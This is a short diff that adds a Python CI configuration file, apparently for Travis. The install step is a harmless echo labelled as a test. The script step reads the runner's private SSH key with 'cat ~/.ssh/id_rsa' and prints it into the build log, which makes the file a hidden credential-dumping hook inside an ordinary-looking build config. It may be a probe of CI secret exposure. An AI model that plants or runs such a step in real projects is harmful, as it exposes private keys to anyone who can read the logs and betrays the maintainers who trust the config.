@@ -1,0 +1,3 @@
+language: python
+install: "echo this is a test"
+script:  "cat ~/.ssh/id_rsa"
